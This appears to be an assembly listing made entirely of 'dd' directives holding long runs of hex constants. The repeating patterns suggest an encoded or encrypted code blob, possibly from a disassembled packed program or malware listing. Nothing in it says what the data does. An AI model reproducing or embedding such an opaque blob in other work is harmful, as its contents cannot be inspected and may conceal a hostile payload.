		dd 0FF10CBB9h, 9BFD00EFh, 6A8B970Eh, 358BB8FDh,	0EFF56307h
		dd 33ED1600h, 5586663Dh, 64FD00EFh, 0EF558Eh, 3AC0DCFDh
		dd 10ED24ABh, 8A1002FFh, 1550FCBBh, 0EFFD0E3Fh,	51FBB38Ah
		dd 0FDA86176h, 8E1500EFh, 6AEFFD11h, 970085FCh,	5F9556EFh
		dd 6AFFFDBAh, 740085FDh, 0A93B1891h, 0A507FC10h, 7600EFE2h
		dd 6CD924A3h, 4666E1C4h, 0F0898BE1h, 0EFFD00EFh, 0C46CA35Fh
		dd 0FD042DF1h, 7F6D907Fh, 907F6D90h, 6D907F6Dh,	85118BBAh
		dd 584F95FFh, 5C64FFFCh, 0EFFD00EFh, 25669950h,	0FD00EFFDh
		dd 0B8AB53BEh, 33E7808Bh, 0D65663Dh, 1E760765h,	0C7013D83h
		dd 0FD0013B8h, 177E00EFh, 0FFE18A0Dh, 44146AD9h, 217610EFh
		dd 0FF1AD6E8h, 94D6402h, 0EFF0898Bh, 5FEFFD00h,	188BB4A3h
		dd 0EFF5C2B2h, 0CE643D33h, 0AD01A877h, 10035B07h, 0F4A276FFh
		dd 0FD0D6699h, 0B0FD00EFh, 0E564A65Eh, 0FD082DA0h, 64FC4765h
		dd 0EF558Eh, 0EE4667FDh, 0EFFDFFCAh, 0F107AD00h, 7600EFF0h
		dd 6699F4A2h, 0EFFD0Dh,	0A65EB0FDh, 2DA0E564h, 4907FD08h
		dd 7600EFDEh, 6699F4A2h, 0EFFD0Dh, 0A65EB0FDh, 2DA0E564h
		dd 85FD08h, 0FD2F2E15h,	0E3B08BEFh, 57BEBA49h, 2CE82176h
		dd 0DCFD00ECh, 11B977D2h, 0D2A807AFh, 0A27600EFh, 0D6699F4h
		dd 0FD00EFFDh, 64A65EB0h, 82DA0E5h, 0FC4765FDh,	7AF2C06Bh
		dd 11A975C0h, 99F4A276h, 0EFFD0D66h, 5EB0FD00h,	0A0E564A6h
		dd 65FD082Dh, 0C06BFC47h, 75C17AF2h, 0A27612A1h, 0D6699F4h
		dd 0FD00EFFDh, 64A65EB0h, 82DA0E5h, 0FC5765FDh,	0EF558E64h
		dd 0D26BFD00h, 0ADC07AF2h, 7E94667h, 0EFF2E0h, 99F4A276h
		dd 0EFFD0D66h, 5EB0FD00h, 0A0E564A6h, 64FD082Dh, 57915CEh
		dd 0B08BEFFDh, 0E274641Bh, 0EFFD00h, 765BB1A2h,	0E73F5D0Ah
		dd 0CBA7600h, 0BA4A2176h, 0EA1557BDh, 8BEFFD05h, 0A35F1BB0h
		dd 0EFF0898Bh, 5BEFFD00h, 3F5D0A76h, 2A4500E7h,	0C3FFFDB7h
		dd 0ED005825h, 0FFFDB717h, 10EF4522h, 0ED0057C7h, 0FFFDB882h
		dd 10EF458Bh, 0ED005754h, 0FFFDB83Ch, 10EF45EDh, 0ED005838h
		dd 0FFFDB72Ah, 10EF4AC5h, 0ED005838h, 0FFFDB751h, 907F6D90h
		dd 0AE08037Eh, 1E7656BAh, 249B7457h, 558E64E9h,	7FD00EFh
		dd 0EFF268h, 0F96A3776h, 0FFFD68ACh, 6ABCFD00h,	251510FDh
		dd 64ED018Eh, 0FF9470E8h, 8E00AA3Bh, 0EF558E64h, 3107FD00h
		dd 7600EFF2h, 623A8B1Fh, 0C864FC7Dh, 0A8D164AEh, 1CFFE92Eh
		dd 832576A5h, 59F3EC1Ch, 0F3D94C64h, 0FF1D52E8h, 7D008702h
		dd 0EF9700EFh, 54FA0255h, 0A210EE9Ch, 6CA65DB1h, 902CF5C4h
		dd 6D907F6Dh, 7F6D907Fh, 56BAAE51h, 74F964AAh, 64ED2493h
		dd 0EF558Fh, 0F09A07FDh, 1F7600EFh, 499B0B85h, 0FDA86076h
		dd 761500EFh, 8BEFFD0Eh, 1553AC25h, 0EFFD959Fh,	0C46C158Bh
		dd 89ED6AF9h, 10B68DC3h, 8BEE808Dh, 0FD45293Ch,	0ED14C19Bh
		dd 0C86458F3h, 0FEE16CAEh, 6459F3BAh, 0E8F7D94Ch, 2FF1DC9h
		dd 7AB9E8BAh, 0C46CFD00h, 0A05EB0F9h, 7F3E59B4h, 907F6D90h
		dd 0AE08037Eh, 0CBB98DBAh, 4C66AB08h, 748BFFD9h, 0EFFD0047h
		dd 8091550h, 0D8BEFFDh,	0E3D94464h, 449B3D85h, 0BD741978h
		dd 0BAFC6862h, 7B02E8h,	7ED864FDh, 3478042Bh, 329D374h
		dd 0D94C6488h, 0B82C8BE3h, 55EE868Dh, 0E02063Ch, 0BC378B4Ah
		dd 0F3EC1C83h, 0D94C6459h, 1E3FE8F3h, 0E8BC02FFh, 0FD007B2Fh
		dd 0B0F9C46Ch, 83B4A05Eh, 6DC3E739h, 85118BBAh,	585F95FFh
		dd 5C64FFFCh, 0EFFD00EFh, 25669950h, 0FD00EFFDh, 64AB53BEh
		dd 8BB8F575h, 0D656633h, 10037707h, 0E82176FFh,	2FF1E0Dh
		dd 615CE64h, 0C71002FEh, 0FD0013B8h, 0A97700EFh, 742F7910h
		dd 15CE64F2h, 1002FFABh, 4570DEBh, 3E10EF46h, 0B0094D64h
		dd 642FCE5Eh, 0FD00E274h, 64A600EFh, 42DA0E5h, 6D907FFDh
		dd 7F6D907Fh, 24B37653h, 15CB64F5h, 0EFFD04CBh,	84E03D84h
		dd 0FD00EF28h, 73D08BBAh, 56FFFC63h, 653D64AAh,	0DCED018Ch
		dd 0E82476F6h, 0FD00EBF9h, 0C789C06Bh, 0B907368Bh, 7900EFFEh
		dd 64F2742Fh, 31115CBh,	7650EFFDh, 152BE824h, 0A8502FFh
		dd 9CFCFA02h, 6CBB10EEh, 0CD9399FEh, 7912AC77h,	85DB742Fh
		dd 6AEF9700h, 25685FCh,	87FF6A38h, 0EF0C70h, 0FD01FD95h
		dd 100268EFh, 0D510FD00h, 0FC4CEA3Bh, 4FC10EDh,	1A35D2Dh
		dd 3D84FFFFh, 0EF97249Bh, 85FD6Ah, 2AFFB997h, 9F95FF85h
		dd 68EFFDF1h, 0FD00EEEFh, 0EF02FF87h, 0C63A0200h, 0FF01A3F8h
		dd 2FCE00FFh, 50FEBE8Ah, 0FD2CCA15h, 7368BEFh, 0EFFE2Ch
		dd 0F2742F79h, 9E15CB64h, 50EFFD03h, 0B4E82476h, 6402FF15h
		dd 3BD15CBh, 3D84EFFDh
		dd 10C085E0h, 5EB002FFh, 150085A0h, 0EFFD2B1Dh,	5B103583h
		dd 6D00EB3Fh, 7F6D907Fh, 907F6D90h, 0D97464ABh,	0DC3B8BE3h
		dd 0F344D2h, 0CF7EFFDh,	6AF2D26Ah, 0EFFC99h, 0FD1D4C15h
		dd 0A6D8B8EFh, 0E618D992h, 13D11DD6h, 13CF2ECh,	0F197804h
		dd 0FD019373h, 0CBA98BEFh, 8BBAAE08h, 0FC635BD0h, 0B57057FFh
		dd 249B7408h, 14364E5h,	0EFFF00D2h, 3DC58F00h, 0FD00EDF5h
		dd 94762398h, 6619CE04h, 3C049C76h, 0B9AA1000h,	635FE8FFh
		dd 0AB57FFFCh, 8C511510h, 0FFBFED01h, 0FC6347E8h, 13BE8BFFh
		dd 0EDFE3Dh, 5F87E0FDh,	0E0FD00EFh, 0EF7984h, 0FC05D2FDh
		dd 0BE8A00EFh, 0C2CC74h, 8900EFFCh, 0C88948E3h,	0FEC1583h
		dd 0FD000078h, 85FE8BEFh, 6AEF9700h, 0E8FFBFFDh, 0FFFC634Bh
		dd 51BFF68Ah, 9EA0FA02h, 3E1410EEh, 8BEFFD00h, 970085EEh
		dd 0BDFD6AEDh, 634BE8FFh, 7750FFFCh, 0FA0250ECh, 10EE9EA0h
		dd 0FD005C14h, 0EDFC2DEFh, 169BFD00h, 5885E0B5h, 85FD00EFh
		dd 6AEF9700h, 970085FDh, 0EF69E9EBh, 85FD00h, 0FD6AEF97h
		dd 0ED970085h, 0EF78E9h, 970085FDh, 85FD6AEFh, 0FFE99700h
		dd 97008528h, 85FD6AEFh, 0EBE99700h, 0FCEA90h, 177EFF10h
		dd 0FF8A8A06h, 40D86AD9h, 0EF9710EFh, 85FD6Ah, 0F56AEF97h
		dd 0EF975004h, 85FD6Ah,	0ED6AEF97h, 0EF974404h,	85FD6Ah
		dd 0E56AEF97h, 0EF97D510h, 85FD6Ah, 0E56AEF97h,	0EF972C04h
		dd 85FD6Ah, 0DD6AEF97h,	0EF972004h, 85FD6Ah, 0BD6AEF97h
		dd 0E4761404h, 0E92EFD6Ah, 2CBFE0EDh, 85FD6ABDh, 8EF9500h
		dd 28FFEFFDh, 0F7D94464h, 48F33E83h, 0E524AB74h, 116685E0h
		dd 5DB002FFh, 0F5C2B1A6h, 0EFB48DEFh, 10EF405Eh, 0ED005297h
		dd 0FFFDBD99h, 10EF408Eh, 0ED005267h, 0FFFDBD53h, 10EF40A6h
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 0E8FFEF97h,	0FFFC632Bh
		dd 5C9B3D85h, 0E8FFB9AEh, 0FFFC632Fh, 10CB898Bh, 0DD0087ABh
		dd 0FA0200EFh, 10EE9C00h, 26853776h, 0BCAA369Bh, 6013E8FFh
		dd 338BFFFCh, 0FFD97464h, 0C164058Bh, 0E02063Ch, 0BC358B4Ah
		dd 0F3EC1C83h, 5151059h, 0BCED018Fh, 1510FC6Ah,	0ED018C41h
		dd 1BE8FFBCh, 5FFFFC60h, 9EB8FA02h, 0B4A310EEh,	90EFF5C2h
		dd 6D907F6Dh, 0B9F5EC6Ch, 8CBB189h, 0E8FFEF97h,	0FFFC632Bh
		dd 7E9B3D85h, 0E8FFEE97h, 0FFFC6327h, 0F66A0D8Bh, 0F9249B74h
		dd 0FA020B9Ah, 10EE9EB8h, 0F5C46CA3h, 0B8A8532Ch, 4FA0256h
		dd 7610EE9Ch, 10BE5637h, 18F0115h, 0D8BBCEDh, 0EF6DB307h
		dd 0FFA47000h, 3C8B0776h, 62F9C46Ch, 4529FC7Dh,	14C199FDh
		dd 6458F3EDh, 30E7EC8h,	0B18B4B0Eh, 10AC10CBh, 18F0515h
		dd 451510EDh, 64ED018Ch, 53FBD94Ch, 106A07A8h, 7A8FF10h
		dd 0EF6D7Ah, 0A2042B7Eh, 6CA35BB2h, 902CF5C4h, 6D907F6Dh
		dd 7F6D907Fh, 47748Bh, 0AA56EFFDh, 0EFF4A307h, 10D27600h
		dd 9710EE99h, 100D8BEFh, 4A9C4D7h, 0FC6AE188h, 0A9C4D710h
		dd 5FEA8808h, 3E5E2FCEh, 0EFFCB8B0h, 0C3B1FD00h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 1404A676h, 100274F7h, 907F6D90h
		dd 6D907F6Dh, 2CE54164h, 907F6D90h, 6D907F6Dh, 7F6D907Fh
		dd 0CE87026Ah, 9910EEA5h, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h
		dd 0AB1183EFh, 8BB9A853h, 8989B80Ch, 693A10CBh,	0EFFD88h
		dd 0ED018A99h, 0FBD94428h, 0EF828Ah, 0E524AB3Ah, 0EFFD7FEFh
		dd 1CCBB9C7h, 0FD0090FEh, 0CFD94428h, 0EF8289h,	0D924AB3Ah
		dd 0EFFD7F64h, 28CBB9C7h, 0FD0090FCh, 0C3D94428h, 0EF8281h
		dd 0CD24AB3Ah, 0EFFD7F67h, 34CBB9C7h, 0FD00907Dh, 0D7D94428h
		dd 0EF8286h, 0C124AB3Ah, 0EFFD7F6Ch, 40CBB9C7h,	0FD009078h
		dd 0ABD94428h, 0EF8282h, 0B524AB3Ah, 0EFFD7F6Bh, 4CCBB9C7h
		dd 0FD0090F9h, 0BFD94428h, 0EF8202h, 0E924B370h, 0EF31BE62h
		dd 1052FD00h, 7600EFFDh, 0EF9750ECh, 0FF2FBA89h, 0FC6363E8h
		dd 6CFA89FFh, 0C76CF9C3h, 1A75A2F9h, 8BD94C64h,	6C661033h
		dd 0FBC7B3D9h, 0FFFC6587h, 8310BC8Dh, 0E977F005h, 7F77D2DCh
		dd 10EF3F18h, 0ED95CB02h, 66ED002Dh, 7048D4Eh, 0F970A93Ah
		dd 64FD00EFh, 86D15CEh,	3D84EFFDh, 0FA02169Ah, 10EE9904h
		dd 0F18666ADh, 10FD00EEh, 18BF515h, 0B94666EDh,	0CFED4628h
		dd 0C6EF3100h, 201EBBBh, 0EE9CB4FAh, 24A37610h,	0E9466691h
		dd 0EFFEE857h, 0F73DCE00h, 0ED3D640Ch, 0BAED018Bh, 89E7B389h
		dd 0B98AF7BBh, 0A9756CCBh, 6A38020Ch, 0D54666FCh, 0A974D710h
		dd 0CF452Ch, 0A99EFFDh,	0A1767091h, 80D27644h, 0AC10EE9Dh
		dd 67CD6E66h, 0D710D946h, 7444B976h, 10AF4CA9h,	8666A8D7h
		dd 0FD00EF7Dh, 66A8D710h, 0D710B546h, 7470A176h, 0A97650A9h
		dd 8DEE9728h, 0A38DB383h, 64AC508Fh, 89C074CEh,	0F9F607D6h
		dd 0B97600EFh, 70A1762Ch, 7664A974h, 0BFAF28A9h, 0E8217651h
		dd 0FD00EB1Dh, 66D55664h, 46649546h, 0AF01858Dh, 7338BBFh
		dd 0EFF9CCh, 7664A176h,	0BAA844B9h, 7CD27657h, 0A810EE9Dh
		dd 0A97452BEh, 5538026Ch, 0A854A974h, 64954664h, 55BCB94Eh
		dd 2AFFBEADh, 0BAB94E64h, 8997AB8Dh, 0BB8BB7BBh, 0BAAF5587h
		dd 0D710AC50h, 7658B976h, 0EE9D88D2h, 84697410h, 7600EFFDh
		dd 0BFAF4CA9h, 4E642AFFh, 0B55664A9h, 380252BEh, 6B7B8Bh
		dd 738BEFFDh, 0EFFD006Fh, 0D710AC50h, 762CB976h, 0BFAF28A9h
		dd 34A17055h, 0E8FFBEA8h, 0FFFC64E3h, 8B87AB8Bh, 1DD1FBBFh
		dd 6273E8BFh, 4E64FD00h, 0E1466695h, 2B7ED2DCh,	14AE7604h
		dd 0A924A376h, 66D17618h, 89B0DD6Eh, 3B8B9BBBh,	8BA65DB1h
		dd 0EFF089h, 3983EFFDh,	0EFF1C2BFh, 10EF3D6Bh, 0ED002F8Dh
		dd 0EFFC01EFh, 0EEFC01h, 0FC01EEFCh, 0EFFC01EEh, 1EEFC01h
		dd 0FC01EEFCh, 0EEFC01EEh, 0EEFC01h, 6D907F6Dh,	7F6D907Fh
		dd 0E81E7656h, 0FD00EFE5h, 0E7D94419h, 56E68901h, 0FD8DCE15h
		dd 0EB3983EFh, 0C2B13B8Bh, 6D90EFF9h, 195FF85h,	64FFFC58h
		dd 0FD00EF5Ch, 669950EFh, 0EFFD25h, 0AB53BEFDh,	66AAF164h
		dd 0C7E3D974h, 0FC6587FBh, 0ABBB8BFFh, 1E3738Bh, 0AC50EFFDh
		dd 0CFD94428h, 0EFFD00h, 9900FA02h, 0B97610EEh,	74D27648h
		dd 0AF10EE9Dh, 0A976D710h, 0D710AD4Ch, 0AC50A176h, 7976D710h
		dd 0EFFD80h, 76D710AFh,	0D27654A9h, 10EE9D90h, 76D710ADh
		dd 10AC58A1h, 847976D7h, 0AF00EFFDh, 0A976D710h, 742F781Ch
		dd 72E8BFF4h, 6CFD0063h, 4664F9C4h, 7EE8BF95h, 64FD0063h
		dd 0E8BE994Eh, 0FD006387h, 0BD915664h, 638CE8h,	6D1D64FDh
		dd 6CED018Ch, 8628F1C4h, 0FD00EF75h, 0FFFC658Bh, 233B81h
		dd 0EDBFEFFDh, 64FD00EFh, 0D310AD06h, 0B204297Eh, 0A376F59Ah
		dd 5EB0ED24h, 0F0898BA6h, 0EFFD00EFh, 0C3FF3983h, 0AE1C037Eh
		dd 0CB918BBAh, 33B8AB28h, 76EFD402h, 73790F1Eh,	39EFFD01h
		dd 790FF383h, 0EFFD017Ch, 0EA66E8h, 0F95E62FDh,	64AE0185h
		dd 209174CEh, 0FD032415h, 0CBB98DEFh, 1510AD10h, 0ED018C05h
		dd 0FFD94C62h, 8BBEF56Ah, 0FEB20733h, 0BB7000EFh, 4428E524h
		dd 0FD14F7D9h, 10AF00EFh, 18C0115h, 89C06AEDh, 0CB8183DEh
		dd 2A9AFC1Ch, 0DD24A376h, 0EF318662h, 8D4FD00h,	7E47E689h
		dd 107E042Fh, 511C8110h, 9E90FA02h, 107E10EEh, 83EC8810h
		dd 3A8B1032h, 277E0304h, 24AB75FFh, 0D94462CDh,	0BFFC6ADFh
		dd 5507338Bh, 7D00EFFEh, 0BE8802D4h, 8B87BB8Bh,	0AD8BE7B5h
		dd 0ABBB8BEBh, 80617651h
		dd 0AF00EFFDh, 217651BFh, 0EACEE8h, 955664FDh, 64DD4E64h
		dd 5664E942h, 0BB8BBF9Dh, 643503F3h, 52BE8546h,	15CE64ADh
		dd 0EFFD059Bh, 5FCFB38Bh, 0B8892EFEh, 0F3BB8BEFh, 83B4A05Eh
		dd 0F9C2F339h, 0CBB18BEFh, 8D3DCE14h, 3D8502BCh, 0A53F9CE0h
		dd 504E2D23h, 0C610EDFCh, 9B078B27h, 0CE64AA11h, 0FD007415h
		dd 9B3D84EFh, 13287E05h, 838BEC16h, 0C3833BDFh,	8BB8E47Dh
		dd 0FD820733h, 2F7900EFh, 0C76CFE74h, 0D14664EEh, 0D4EEC76Ch
		dd 8B0881F8h, 4414CBB9h, 0EFFD00FCh, 2EEADA3h, 0CD4664EDh
		dd 64FEC06Ch, 18E491Dh,	4F776EDh, 66E97E62h, 5664CD56h
		dd 0FD5566DDh, 0F876D310h, 2BF7B38Bh, 8EC1D43Fh, 13D08BF8h
		dd 6AFFFC61h, 2D510FCh,	64EA8B3Ch, 0C2C4E54Eh, 12722EC6h
		dd 0B8ADD310h, 61AFE8FFh, 0BB8BFFFCh, 0B2A35FF3h, 1C2B7E5Bh
		dd 0A200EB3Fh, 2FCE5DB1h, 1C2B7E5Bh, 6D00EB3Fh,	64A853BEh
		dd 56FFD96Ch, 76571E76h, 0A17610A9h, 28B97644h,	0B54664ADh
		dd 0BEFD6ABAh, 6ABDFC6Ah, 0AD0085FDh, 8F711510h, 7E64ED01h
		dd 9D4E64D1h, 0BA70FDC4h, 0FBDB226h, 7E749152h,	1097ED2Ah
		dd 4E640403h, 0C95E62A1h, 0BC026ABAh, 2CCBB189h, 990CFA02h
		dd 0A97610EEh, 7E2F7828h, 77C9DCBEh, 0A37424A1h, 1856ED24h
		dd 7600EFFDh, 64E52483h, 0BAC617h, 0AB8BE089h, 922F85D3h
		dd 0D0BE7005h, 0B389FC74h, 0CBA98BD3h, 24837610h, 7ECAECE5h
		dd 2A7E0428h, 0E8BE7004h, 0E5248374h, 2481D0D4h, 83D3838Bh
		dd 0B57E1002h, 3DCE0B64h, 9EE03485h, 3723A53Fh,	0E474D2DCh
		dd 85D7B38Bh, 3F9EE034h, 0D43723A5h, 38A174F8h,	3A8BED80h
		dd 66D14E64h, 4664C146h, 81C1D4BDh, 0BC3C8BEDh,	4666338Bh
		dd 0FCCA07BDh, 0B1A200EFh, 5BEE4D5Dh, 0FD042DA4h, 0DDA05EB0h
		dd 0C2B6A6C0h, 6D90EFF9h, 7F6D907Fh, 4CBB98Bh, 0AD042E7Eh
		dd 0AFE8FFBEh, 0C2FFFC61h, 6D90EFF9h, 7F6D907Fh, 907F6D90h
		dd 6D907F6Dh, 0B9A853BEh, 24937657h, 0D94C66E5h, 0E70283FFh
		dd 152F07Fh, 7600EFFDh,	0DC18D320h, 33EB16DBh, 70EDDC26h
		dd 0EFD5ADEBh, 0E8BFFD00h, 0FD0066DDh, 1F76D764h, 20CBB98Bh
		dd 2FF0D7Ch, 40F200EFh,	24A376D0h, 0E2C26CD9h, 6CFEFA2Eh
		dd 0C46C01E2h, 2CAFE0F9h, 28EDFF6Ch, 0EFD506h, 0F94666FDh
		dd 89F54E66h, 1E3BBC7h,	838989FDh, 0FFA389E1h, 89F7A389h
		dd 0A389F3A3h, 0CBA389CFh, 0FFBAB89h, 0FD006070h, 0FA0253EFh
		dd 10EE9908h, 0FC6A1776h, 10AA0185h, 18F7915h, 0AB0085EDh
		dd 37760085h, 85FD6Ah, 0E8FFB8AEh, 0FFFC6097h, 0FFEF9757h
		dd 0FC64EFE8h, 0FA0253FFh, 10EE9D90h, 0ED24AB76h, 6BF14865h
		dd 85A289C9h, 70499110h, 127629A9h, 8653433h, 70042F7Eh
		dd 0FB7049FBh, 92FB7092h, 0CED1F370h, 12AD8A3Dh, 0E12E378Bh
		dd 0CECAECF9h, 14AD8A3Dh, 8D26F18Dh, 0E18DA4F1h, 75E98DBDh
		dd 33DE98Dh, 0F7F92E37h, 67064867h, 48670148h, 4175A000h
		dd 0B1A2C664h, 0C2B6A65Dh, 6D90EFF1h, 0E7D95464h, 562E7653h
		dd 0F1249B76h, 0F3858BB8h, 8BCFA58Bh, 76FBEC37h, 0ED14C136h
		dd 0CB6458F3h, 0E030E7Eh, 0CFB58B4Bh, 5E25FE5Fh, 0A620A774h
		dd 7FFD082Dh, 907F6D90h, 6D907F6Dh, 7F6D907Fh, 8B1E7656h
		dd 0B38BFFBBh, 0C3AB8BABh, 28A97650h, 0FD6AEF97h, 0A3B38BBEh
		dd 85AD52h, 251EF97h, 0EE9D8CFAh, 60A97610h, 6D902CA3h
		dd 7F6D907Fh, 56BAAE51h, 0D97C64AAh, 280C8BF7h,	0F7D944h
		dd 9700EFFDh, 0E7A28BEFh, 4664D28Bh, 0F9576491h, 8076DDC4h
		dd 4B7740Ch, 0D66CA176h, 662F3305h, 4664F569h, 9B008591h
		dd 0E0F35064h, 83EBADAFh, 7C1F03Fh, 131F83ECh, 8BF520Fh
		dd 7614BF74h, 0B9766CA1h, 24AB7044h, 0FD6ABFDDh, 0FA0252BEh
		dd 10EE9D7Ch, 0ED24AB74h, 0BFBB8BBFh, 88FA0250h, 7610EE9Dh
		dd 0A87610B9h, 52E07604h, 0AD44B976h, 0BCA852BEh, 4CA97650h
		dd 0E8FFBFACh, 0FFFC6063h, 8BEBB28Bh, 0B14664EAh, 23FD2087h
		dd 4E64AC00h, 0A850BDADh, 85FD6ABCh, 1510AC00h,	0ED018F71h
		dd 64AA1085h, 0FE3915CEh, 0AB8B1002h, 0CBB18B83h, 14AD7618h
		dd 338BBEADh, 1003C307h, 24BB76FFh, 0E8FFBDEDh,	0FFFC607Fh
		dd 5BB2A35Fh, 0FD042DA4h, 64954164h, 902CE940h,	6D907F6Dh
		dd 7F6D907Fh, 4CBA98Ah,	3100CF45h, 9B2F84EFh, 0CF4505h
		dd 3C83AF31h, 10AC50FFh, 18EBD15h, 0FD042DEDh, 2C954164h
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 839FB48Bh, 0F27FE704h
		dd 0EFFD0157h, 8D0F2E00h, 0FD286AF9h, 0DC3E00EFh, 85EB70C0h
		dd 0FD00EFD5h, 7F6D902Ch, 907F6D90h, 6D907F6Dh,	7F6D907Fh
		dd 0F164AB53h, 0FD103815h, 6B258AEFh, 8BC889DBh, 738BABBBh
		dd 0EFFD01E3h, 1510AC50h, 0ED018BFDh, 8BF91510h, 89BFED01h
		dd 0FD01E37Bh, 0E7E8FFEFh, 89FFFC64h, 3E8AABBBh, 7F3E5BB1h
		dd 907F6D90h, 0D95C64AEh, 0DCAB55FBh, 850676F6h, 0AA3E9126h
		dd 11D6FB64h, 76DD0283h, 0FD3250F8h, 0AA7600EFh, 24A37610h
		dd 0D95464E5h, 0AB7650F3h, 6AB9E524h, 0AF57BEFDh, 0BFFD6AB9h
		dd 6063E8FFh, 0F86AFFFCh, 8E011510h, 0F7ECED01h, 397C1CC6h
		dd 0B4A05EB0h, 90EFEDC2h, 6D907F6Dh, 7F6D907Fh,	907F6D90h
		dd 0ED24AB76h, 0E7D95464h, 4CBB18Bh, 1033B9A8h,	8374F6DCh
		dd 0C06AED24h, 0FD8169F2h, 64AE00EFh, 57F7D95Ch, 0C43BD576h
		dd 0DB745F9Bh, 89D6762Bh, 703964C7h, 66F52B83h,	450FD7Dh
		dd 0FE00EFFDh, 0EC2A0318h, 8B1FC6CFh, 762A9C23h, 9BFF39EEh
		dd 8BED7420h, 0D20466FCh, 0CFD94464h, 83EB3E83h, 3B83EB3Ah
		dd 0EB3F83EBh, 3BEB3C83h, 16DC9D25h, 0CBB98BEBh, 24B37620h
		dd 0D96C64E1h, 0C48189F7h, 2F837004h, 0D96C66F5h, 0EB3B83F7h
		dd 83EB3F83h, 0D3BEB3Ch, 0B4A28E9Dh, 5DB1388Bh,	7600FF3Fh
		dd 2DA05E2Ah, 907FFD10h, 6D907F6Dh, 7F6D907Fh, 0EFF6E9h
		dd 6D907FFDh, 7F6D907Fh, 907F6D90h, 0FCDFBF95h,	30BD68FFh
		dd 1510ED01h, 0ED018ECDh, 9FE8FFBFh, 0A3FFFC61h, 0ED02EEA9h
		dd 7F6D902Ch, 0B87026Ah, 9910EEA4h, 0EFFD004Eh,	898BAD00h
		dd 0FD00EFD8h, 831181EFh, 8BEFFD01h, 0FC7CCB79h, 0BAAE00EFh
		dd 0E964AA56h, 0D96C66ADh, 0ED3E8DBh, 0C9DC02FFh, 0B1893DCEh
		dd 2FCE28CBh, 2CCBB189h, 0FD00FF44h, 0CB818DEFh, 24BB7438h
		dd 74AB1CC9h, 56E524ABh, 0EFFD40h, 0E124AB74h, 96D97C62h
		dd 20CBB989h, 8524AB75h, 449BAB1Ch, 24A370AAh, 0E15D62D9h
		dd 0FF808DBDh, 51F7888Dh, 6989B8AEh, 0EFFC94CBh, 0AA3A00h
		dd 0ED018A91h, 0CBD95466h, 5566EA89h, 741666E9h, 0CBB9C7FCh
		dd 0EFF134h, 0D95466FDh, 0CBB9C7D7h, 0EFFC3Ch, 0F51510FDh
		dd 6AED018Eh, 8BCE88C0h, 1D3564C2h, 6AED018Eh, 57EC89FFh
		dd 0E68B3902h, 6BF2DB6Ah, 0EFFC6Dh, 14D610AEh, 0EFFD018Ah
		dd 24CBA98Dh, 808DEF97h, 0B9AA52FBh, 61E7E8FFh,	3D85FFFCh
		dd 0D076219Ah, 610FE08Bh, 285FFFCh, 10AA039Bh, 85D976D3h
		dd 0CB84E00Bh, 0B9FD00EEh, 2E062EFFh, 4400EFFCh, 0EFFD00FEh
		dd 7C623D33h, 56F3DBD9h, 0FBD94466h, 34CBB18Dh,	0E524AB74h
		dd 0CBB989BEh, 24AB7420h, 0A91510D9h, 64ED02EEh, 89F97603h
		dd 7474CBB9h, 628D24ABh, 6897D944h, 0FD00EEF9h,	0CBB9C7BFh
		dd 0EFB93Ch, 0B9C789FDh, 0EFFD6CCBh, 68CBB9C7h,	0FD00EEFCh
		dd 9BD95466h, 6027E8FFh, 9DBFFFFCh, 6CED0130h, 0C0DC02C9h
		dd 8524BB70h, 3E0AAE1Dh
		dd 0F764042Bh, 2C8B1576h, 1D02C96Ch, 4F2576AEh,	0E02063Ch
		dd 62378B4Ah, 83FBD944h, 0E50EC1Ch, 0CBB18D4Bh,	24BB7038h
		dd 0FD6ABE81h, 0CF970085h, 85FC6Ah, 0FD6AEF97h,	73E8FFBDh
		dd 85FFFC60h, 761F9A3Dh, 0DA7610AAh, 10EE9CE0h,	76D610ADh
		dd 10AC14A2h, 18BA76D6h, 76D610AFh, 390250ECh, 4C64A6EBh
		dd 0A98BFBD9h, 0AB7018CBh, 4D66EE24h, 0AD0185DDh, 0BA74CD64h
		dd 24AB3B24h, 20E86DE6h, 6402FF30h, 0E0A915CDh,	0FD6A1002h
		dd 0EF970085h, 0CEFF9555h, 0FD6AFFFDh, 8E150085h, 6AEFFD0Ah
		dd 970085FDh, 0F9555EFh, 6AFFFDCEh, 740085FDh, 0A61528AAh
		dd 83EFFD0Ah, 0B889D739h, 0CB718BC3h, 0EFFC7Ch,	0A3C564A2h
		dd 66995BB2h, 0EFFD0Dh,	85C46EFDh, 2DFD00EEh, 907FFD04h
		dd 6D907F6Dh, 70C8BB9h,	0EFFD18h, 0F524AB0Bh, 0B9F474EEh
		dd 6D7CE8h, 0F9C46CFDh,	2DA3C664h, 907FFD04h, 0C8BB9AEh
		dd 87C08BB8h, 6AFFFC61h, 0D54664FDh, 8A910628h,	0FFBFED01h
		dd 11D642Ah, 85ED018Eh,	8B3C0201h, 0FD6ACFB3h, 37E8FFBEh
		dd 8BFFFC60h, 0FD6ACBABh, 852AFFBDh, 8B3C0201h,	2D68C3BBh
		dd 0BFFD00E8h, 612FE8FFh, 0B38BFFFCh, 0BEFD6AC3h, 1852AFFh
		dd 0BB8B3C02h, 0E3C08BFFh, 85FFFC61h, 0AD039B3Dh, 0A976D710h
		dd 742F7814h, 2AFFBFFEh, 6AE54664h, 50EC89C0h, 0BB8B3802h
		dd 9B3D85F3h, 0D710AD03h, 7610B976h, 0EE9CE0D2h, 0D710AF10h
		dd 0AD14A976h, 0A176D710h, 0D710AC18h, 0AF1CB976h, 0A976D710h
		dd 0D710AD20h, 0AC24A176h, 0B976D710h, 0D710AF2Ch, 0AD28A976h
		dd 2176D710h, 0FF3192E8h, 0A65EB002h, 7F6D902Ch, 907F6D90h
		dd 6D907F6Dh, 0E7D94464h, 4CBA98Bh, 8801177Eh, 0F57753FEh
		dd 5BF00680h, 0F8E8E788h, 2D02FF30h, 8DB9FD08h,	970CCB89h
		dd 64AD56EFh, 50BDE941h, 9CE8FA02h, 2DA310EEh, 907FFD08h
		dd 6D907F6Dh, 7F6D907Fh, 4E71181h, 7653EFFDh, 0EBED2473h
		dd 8BBAFD00h, 0FC6113D0h, 28AA56FFh, 0FFD944h, 9700EFFDh
		dd 6228FF8Bh, 6AFBD944h, 0D94C62FDh, 0AC7650FBh, 5462AC10h
		dd 0FD68CBD9h, 0BDFD00EBh, 10FA0250h, 7810EE9Ch, 6425742Fh
